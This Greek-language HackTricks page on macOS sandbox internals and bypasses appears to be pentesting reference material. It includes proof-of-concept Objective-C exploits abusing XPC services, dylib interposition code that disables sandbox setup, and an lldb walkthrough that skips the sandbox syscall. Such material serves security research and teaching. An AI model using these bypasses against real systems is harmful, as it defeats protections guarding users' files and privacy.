# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Διαδικασία φόρτωσης του Sandbox

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Εικόνα από <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Στην προηγούμενη εικόνα μπορούμε να παρατηρήσουμε **πώς φορτώνεται το sandbox** όταν εκτελείται μια εφαρμογή με το entitlement **`com.apple.security.app-sandbox`**.

Ο compiler θα συνδέσει το `/usr/lib/libSystem.B.dylib` με το binary.

Στη συνέχεια, το **`libSystem.B`** καλεί διάφορες συναρτήσεις, μέχρι η **`xpc_pipe_routine`** να στείλει τα entitlements της εφαρμογής στο **`securityd`**. Το Securityd ελέγχει αν η διεργασία πρέπει να απομονωθεί μέσα στο sandbox και, αν ναι, την απομονώνει.\
Τέλος, το sandbox ενεργοποιείται με μια κλήση στη **`__sandbox_ms`**, η οποία καλεί τη **`__mac_syscall`**.<sup>[[1]](#references)[[3]](#references)</sup>

## Πιθανά Bypasses

### Bypass του quarantine attribute

Στα **αρχεία που δημιουργούνται από sandboxed διεργασίες** προστίθεται το **quarantine attribute**, για να αποτρέπονται τα sandbox escapes: αν αποθέσετε μια νέα εφαρμογή και προσπαθήσετε να την εκκινήσετε, το quarantine flag θα τη σταματήσει. Επομένως, **αν μπορείτε να αποθέσετε ένα αρχείο ή φάκελο *χωρίς* το quarantine attribute, μπορείτε να κάνετε escape από το App Sandbox** — απλώς αποθέστε ένα bundle `.app` και εκκινήστε το με `open`, καθώς η νέα διεργασία εκτελείται από το LaunchServices και όχι μέσα στο sandbox σας.

Ο αξιόπιστος τρόπος για να αποθέσετε ένα **unquarantined αρχείο** είναι να ζητήσετε από **μια άλλη διεργασία να δημιουργήσει το αρχείο για εσάς**. Όπως τεκμηριώνεται στο [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) του Mickey Jin, το **App Sandbox** προσθέτει quarantine στα αρχεία που αποθέτει, αλλά οι **XPC services που εκτελούνται μέσα στο Service Sandbox δεν το κάνουν**. Επομένως, αρκετές μη πιστοποιημένες XPC services θα μπορούσαν να χρησιμοποιηθούν ως primitive για το "quarantine laundering":<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) και **CVE-2023-32414** (`ArchiveService`): εξάγουν ένα archive που έχει δοθεί από sandboxed app σε μια επιλεγμένη τοποθεσία **χωρίς να μεταφέρουν το quarantine xattr στο εξαγόμενο περιεχόμενο**.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): το path traversal στη `submitSignpostDataWithConfig:` επέτρεπε τη δημιουργία **αυθαίρετων καταλόγων χωρίς quarantine**, κάτι που αρκεί για τη δημιουργία ολόκληρης δομής bundle `.app` εκτός του container.
- **CVE-2024-27864** (`diskimagescontroller.xpc`): προσαρτά ένα DMG με quarantine **χωρίς να προσθέτει quarantine στη συσκευή που προκύπτει**, επιτρέποντας την εκκίνηση των εφαρμογών στον προσαρτημένο τόμο.

> [!TIP]
> Η εξαγωγή συνήθως **αφαιρεί το bit δικαιώματος εκτέλεσης**. Το workaround που χρησιμοποιήθηκε στο CVE-2023-27944 ήταν να τοποθετηθεί ένας **symlink** προς ένα υπάρχον, υπογεγραμμένο system binary (π.χ. `/System/Library/CoreServices/Automator Application Stub`) ως το κύριο executable του bundle, ώστε να μπορεί να εκκινηθεί χωρίς να απαιτείται `+x` σε ένα αρχείο που αποτέθηκε.

> [!CAUTION]
> Αυτό λειτουργεί επειδή ο έλεγχος βασίζεται στο **flag του στοιχείου που εκκινείται**: *"When an app or other executable code is run from the Finder or GUI, macOS checks its quarantine flag before loading it"*, και μόνο τότε *"it's handed over to Gatekeeper for full 'first run' security checks"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Αν το bundle που εκκινείτε δεν έχει flag, δεν γίνεται έλεγχος από το Gatekeeper — και αυτό ακριβώς το primitive παρέχουν τα παραπάνω CVE.<sup>[[5]](#references)</sup>
>
> Σημειώστε ότι αν ένα bundle `.app` έχει ήδη εξουσιοδοτηθεί να εκτελεστεί (έχει quarantine xattr με ενεργοποιημένο το flag "authorized to run"), θα μπορούσατε επίσης να το καταχραστείτε... με τη διαφορά ότι τώρα δεν μπορείτε να γράψετε μέσα σε bundles **`.app`**, εκτός αν έχετε κάποια προνομιούχα TCC perms (που δεν θα έχετε μέσα σε sandbox).

### Κατάχρηση της λειτουργίας Open

Στα [**τελευταία παραδείγματα Word sandbox bypass**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) φαίνεται πώς θα μπορούσε να γίνει κατάχρηση της λειτουργίας **`open`** CLI για να γίνει bypass του sandbox.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Ακόμα κι αν μια εφαρμογή **προορίζεται να εκτελείται σε sandbox** (`com.apple.security.app-sandbox`), είναι δυνατό να γίνει bypass του sandbox, αν **εκτελείται από ένα LaunchAgent** (για παράδειγμα, `~/Library/LaunchAgents`).\
Όπως εξηγείται σε [**αυτήν την ανάρτηση**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), αν θέλετε να αποκτήσετε persistence με μια εφαρμογή που εκτελείται σε sandbox, θα μπορούσατε να την κάνετε να εκτελείται αυτόματα ως LaunchAgent και ίσως να κάνετε inject κακόβουλο κώδικα μέσω των environment variables της DyLib.<sup>[[6]](#references)</sup>

### Κατάχρηση τοποθεσιών Auto Start

Αν μια sandboxed διεργασία μπορεί να **γράψει** σε μια τοποθεσία όπου **αργότερα μια unsandboxed εφαρμογή θα εκτελέσει το binary**, θα μπορέσει να **κάνει escape απλώς τοποθετώντας** εκεί το binary. Ένα καλό παράδειγμα τέτοιων τοποθεσιών είναι οι `~/Library/LaunchAgents` ή `/System/Library/LaunchDaemons`.

Γι' αυτό μπορεί να χρειαστείτε ακόμη και **2 βήματα**: να κάνετε μια διεργασία με **λιγότερο περιοριστικό sandbox** (`file-read*`, `file-write*`) να εκτελέσει τον κώδικά σας, ο οποίος θα γράψει σε μια τοποθεσία όπου θα **εκτελεστεί χωρίς sandbox**.

Δείτε αυτήν τη σελίδα σχετικά με τις τοποθεσίες **Auto Start**:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Κατάχρηση άλλων διεργασιών

Αν από τη sandbox διεργασία είστε σε θέση να **παραβιάσετε άλλες διεργασίες** που εκτελούνται σε λιγότερο περιοριστικά sandbox (ή καθόλου), θα μπορέσετε να κάνετε escape προς τα sandbox τους:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Διαθέσιμα System και User Mach services

Το sandbox επιτρέπει επίσης την επικοινωνία με ορισμένες **Mach services** μέσω XPC, οι οποίες ορίζονται στο profile `application.sb`. Αν μπορείτε να **καταχραστείτε** μία από αυτές τις services, ίσως μπορέσετε να **κάνετε escape από το sandbox**.

Όπως αναφέρεται σε [αυτό το writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), οι πληροφορίες για τις Mach services αποθηκεύονται στο `/System/Library/xpc/launchd.plist`. Μπορείτε να βρείτε όλες τις System και User Mach services αναζητώντας σε αυτό το αρχείο τα `<string>System</string>` και `<string>User</string>`.<sup>[[4]](#references)</sup>

Επιπλέον, μπορείτε να ελέγξετε αν μια Mach service είναι διαθέσιμη σε μια sandboxed εφαρμογή καλώντας τη `bootstrap_look_up`:

```objectivec
void checkService(const char *serviceName) {
    mach_port_t service_port = MACH_PORT_NULL;
    kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
    if (!err) {
      NSLog(@"available service:%s", serviceName);
      mach_port_deallocate(mach_task_self_, service_port);
    }
}

void print_available_xpc(void) {
    NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
    NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
    for (NSString* key in launchDaemons) {
      NSDictionary<NSString*, id>* job = launchDaemons[key];
      NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
      for (NSString* serviceName in machServices) {
          checkService(serviceName.UTF8String);
      }
    }
}
```

### Διαθέσιμες Mach services του PID

Αυτές οι Mach services έγιναν αρχικά αντικείμενο εκμετάλλευσης για [διαφυγή από το sandbox σε αυτό το writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). Εκείνη την εποχή, **όλες οι υπηρεσίες XPC που απαιτούνταν** από μια εφαρμογή και το framework της ήταν ορατές στο domain PID της εφαρμογής (πρόκειται για Mach Services με `ServiceType` ίσο με `Application`).<sup>[[4]](#references)</sup>

Για να **επικοινωνήσετε με μια υπηρεσία XPC του PID Domain**, αρκεί να την καταχωρίσετε μέσα στην εφαρμογή με μια γραμμή όπως:

```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```

Επιπλέον, είναι δυνατό να εντοπίσετε όλες τις υπηρεσίες Mach **Application** αναζητώντας το `<string>Application</string>` μέσα στο `System/Library/xpc/launchd.plist`.

Ένας άλλος τρόπος για να εντοπίσετε έγκυρες υπηρεσίες xpc είναι να ελέγξετε αυτές που βρίσκονται στα εξής:

```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```

Αρκετά παραδείγματα κατάχρησης αυτής της τεχνικής υπάρχουν στο [**αρχικό writeup**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), ωστόσο, ακολουθούν ορισμένα συνοπτικά παραδείγματα.<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Αυτή η υπηρεσία επιτρέπει κάθε σύνδεση XPC, επιστρέφοντας πάντα `YES`, και η μέθοδος `runTask:arguments:withReply:` εκτελεί μια αυθαίρετη εντολή με αυθαίρετες παραμέτρους.

Το exploit ήταν «τόσο απλό όσο»:

```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
    [conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
    [conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
    [conn resume];
    
    [[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
        NSLog(@"run task result:%@, error:%@", bSucc, error);
    }];
}
```

#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Αυτή η υπηρεσία XPC επέτρεπε την πρόσβαση σε όλους τους clients, επιστρέφοντας πάντα `YES`, ενώ η μέθοδος `createZipAtPath:hourThreshold:withReply:` δεχόταν τη διαδρομή ενός φακέλου και τον συμπίεζε σε αρχείο ZIP.

Επομένως, είναι δυνατό να δημιουργηθεί μια πλαστή δομή φακέλων εφαρμογής, να συμπιεστεί και έπειτα να αποσυμπιεστεί και να εκτελεστεί, ώστε να γίνει διαφυγή από το sandbox, καθώς τα νέα αρχεία δεν θα έχουν το χαρακτηριστικό quarantine.

Το exploit ήταν το εξής:

```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
    NSString *currentPath = NSTemporaryDirectory();
    chdir([currentPath UTF8String]);
    NSLog(@"======== preparing payload at the current path:%@", currentPath);
    system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
    [@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
    system("chmod +x compressed/poc.app/Contents/MacOS/poc");
    
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
    [conn resume];
    
    [[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
        NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
        NSString *file;
        while ((file = [dirEnum nextObject])) {
            if ([[file pathExtension] isEqualToString: @"zip"]) {
                // open the zip
                NSString *cmd = [@"open " stringByAppendingString:file];
                system([cmd UTF8String]);

                sleep(3); // wait for decompression and then open the payload (poc.app)
                NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
                system([cmd2 UTF8String]);
                break;
            }
        }
    }];
}
```

#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Αυτή η υπηρεσία XPC επιτρέπει την παροχή πρόσβασης ανάγνωσης και εγγραφής σε ένα αυθαίρετο URL στον πελάτη XPC μέσω της μεθόδου `extendAccessToURL:completion:`, η οποία δεχόταν οποιαδήποτε σύνδεση. Καθώς η υπηρεσία XPC έχει FDA, είναι δυνατό να γίνει κατάχρηση αυτών των δικαιωμάτων για την πλήρη παράκαμψη του TCC.

Το exploit ήταν:

```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
    [conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
    [conn resume];
    
    [[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
        NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
        NSURL *targetURL = [fpWrapper url];
        
        void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
        PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
        if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
            NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
        else {
            NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
            NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
        }
    }];
}
```

### Στατική μεταγλώττιση & δυναμική σύνδεση

[**Αυτή η έρευνα**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) ανακάλυψε 2 τρόπους παράκαμψης του Sandbox. Επειδή το sandbox εφαρμόζεται από το userland κατά τη φόρτωση της βιβλιοθήκης **libSystem**, αν ένα binary μπορούσε να αποφύγει τη φόρτωσή της, δεν θα γινόταν ποτέ sandboxed:<sup>[[2]](#references)</sup>

- Αν το binary ήταν **πλήρως στατικά μεταγλωττισμένο**, θα μπορούσε να αποφύγει τη φόρτωση αυτής της βιβλιοθήκης.
- Αν το **binary δεν χρειαζόταν να φορτώσει καμία βιβλιοθήκη** (επειδή και ο linker βρίσκεται στο libSystem), δεν θα χρειαζόταν να φορτώσει το libSystem.

### Shellcodes

Σημειώστε ότι ακόμα και τα **shellcodes** στο ARM64 χρειάζεται να συνδεθούν με το `libSystem.dylib`:

```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```

### Περιορισμοί που δεν κληρονομούνται

Όπως εξηγείται στο **[bonus αυτής της ανάρτησης](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, ένας περιορισμός sandbox όπως:<sup>[[4]](#references)</sup>

```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```

μπορεί να παρακαμφθεί από μια νέα διεργασία που εκτελεί, για παράδειγμα:

```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```

Ωστόσο, φυσικά, αυτή η νέα διεργασία δεν θα κληρονομήσει entitlements ή προνόμια από τη γονική διεργασία.

### Αντικατάσταση ενός κληρονομημένου sandbox με spawn attributes (παλαιότερο macOS)

Μια κανονική θυγατρική διεργασία `posix_spawn()` κληρονομεί το sandbox της γονικής διεργασίας. Σε εκδόσεις macOS πριν από τη διόρθωση του Φεβρουαρίου 2026, μια διεργασία-γονέας υπό sandbox μπορούσε αντί γι' αυτό να περάσει ένα **ενσωματωμένο όνομα profile** στην πολιτική MAC του `Sandbox` μέσω της `posix_spawnattr_setmacpolicyinfo_np()`. Τότε η θυγατρική διεργασία λάμβανε αυτό το profile *αντί* των περιορισμών της γονικής διεργασίας. Το ενσωματωμένο profile `no-network` εξακολουθούσε να επιτρέπει πρόσβαση στον αρχικό κατάλογο του χρήστη, οπότε μια θυγατρική διεργασία όπως η `/bin/bash` μπορούσε να ενεργεί σε αρχεία στα οποία δεν είχε πρόσβαση η γονική διεργασία App Sandbox. Αυτό διαφέρει από τη διαδρομή [LaunchServices `open`](#not-inherited-restrictions), όπου μια ξεχωριστή υπηρεσία εκκινεί τη διεργασία. Για τη γενική διαδρομή εισόδου, δείτε τα [MACF policy-specific spawn attributes](../../macos-macf-mandatory-access-control-framework.md#policy-specific-spawn-attributes-as-a-macf-input).<sup>[[7]](#references)</sup>

Για να δοκιμάσετε το όριο ασφαλείας σε έναν **επηρεαζόμενο, απομονωμένο host macOS**, δημιουργήστε ένα ακίνδυνο canary στον αρχικό κατάλογο, έξω από το app container. Εκτελέστε την ίδια θυγατρική διεργασία από μια ήδη περιορισμένη με sandbox γονική διεργασία, πρώτα με συνηθισμένο `posix_spawn()` και έπειτα με ένα blob Sandbox spawn-attribute που επιλέγει το `no-network`. Συγκρίνετε αν η θυγατρική διεργασία μπορεί να διαβάσει το canary. Το ακόλουθο απόσπασμα χρησιμοποιεί τον ιδιωτικό ορισμό `sandbox_spawnattr_t` και τις δηλώσεις συναρτήσεων από τον [sample launcher](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec) του Siguza. Προσθέστε κανονικό χειρισμό σφαλμάτων κατά την ενσωμάτωσή του σε μια δοκιμαστική εφαρμογή.<sup>[[7]](#references)[[8]](#references)</sup>

```c
sandbox_spawnattr_t sb;
posix_spawnattr_t attr;
pid_t pid;
char *argv[] = {"/bin/bash", "-c", "cat \"$HOME/sandbox-canary.txt\"", NULL};
sandbox_spawnattrs_init(&sb);
sandbox_spawnattrs_setprofilename(&sb, "no-network");
posix_spawnattr_init(&attr);
posix_spawnattr_setmacpolicyinfo_np(&attr, "Sandbox", &sb, sizeof(sb));
int err = posix_spawn(&pid, "/bin/bash", NULL, &attr, argv, environ);
if (!err) waitpid(pid, NULL, 0);
```

Μια επιτυχής επιστροφή από το `posix_spawn()` δεν αποδεικνύει ότι έγινε escape: ελέγξτε την **πραγματική πρόσβαση του child σε αρχεία** σε σύγκριση με τη συμπεριφορά ενός συνηθισμένου child. Τα patched συστήματα απορρίπτουν ένα ενσωματωμένο profile που ζητά ένας caller ο οποίος βρίσκεται ήδη σε sandbox, εκτός αν διαθέτει το ιδιωτικό entitlement `com.apple.private.security.sandbox-spawnattrs`. Μην εκλαμβάνετε αυτή την ιστορική συμπεριφορά ως τρέχον bypass.<sup>[[7]](#references)</sup>

### Entitlements

Σημειώστε ότι ορισμένες **ενέργειες** ενδέχεται να **επιτρέπονται από το sandbox** αν μια εφαρμογή διαθέτει συγκεκριμένο **entitlement**, όπως στο εξής:

```scheme
(when (entitlement "com.apple.security.network.client")
      (allow network-outbound (remote ip))
      (allow mach-lookup
             (global-name "com.apple.airportd")
             (global-name "com.apple.cfnetwork.AuthBrokerAgent")
             (global-name "com.apple.cfnetwork.cfnetworkagent")
             [...]
```

### Παράκαμψη μέσω Interposting

Για περισσότερες πληροφορίες σχετικά με το **Interposting**, δείτε:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost το `_libsecinit_initializer` για να αποτρέψετε το sandbox

```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
    printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
	void (*overriden__libsecinit_initializer)(void);
	void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```

#### Παρεμβάλλετε το __mac_syscall για να αποτρέψετε το Sandbox

```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
    printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
    if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
        printf("Bypassing Sandbox initiation.\n");
        return 0; // pretend we did the job without actually calling __mac_syscall
    }
    // Call the original function for other cases
    return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
    const void *replacement;
    const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
    { (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```

### Αποσφαλμάτωση & bypass του Sandbox με lldb

Ας μεταγλωττίσουμε μια εφαρμογή που θα πρέπει να εκτελείται σε sandbox:

{{#tabs}}
{{#tab name="sand.c"}}

```c
#include <stdlib.h>
int main() {
    system("cat ~/Desktop/del.txt");
}
```

{{#endtab}}

{{#tab name="entitlements.xml"}}

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="Info.plist"}}

```xml
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>xyz.hacktricks.sandbox</string>
    <key>CFBundleName</key>
    <string>Sandbox</string>
</dict>
</plist>
```

{{#endtab}}
{{#endtabs}}

Στη συνέχεια, μεταγλωττίστε την εφαρμογή:

```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```

> [!CAUTION]
> Η εφαρμογή θα προσπαθήσει να **διαβάσει** το αρχείο **`~/Desktop/del.txt`**, κάτι που το **Sandbox δεν θα επιτρέψει**.\
> Δημιουργήστε εκεί ένα αρχείο, καθώς μόλις παρακαμφθεί το Sandbox, θα μπορεί να το διαβάσει:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Ας κάνουμε debug στην εφαρμογή για να δούμε πότε φορτώνεται το Sandbox:

```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
    frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
    frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
    frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
    frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
  x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
    0x187659904 <+4>:  svc    #0x80
    0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
    0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```

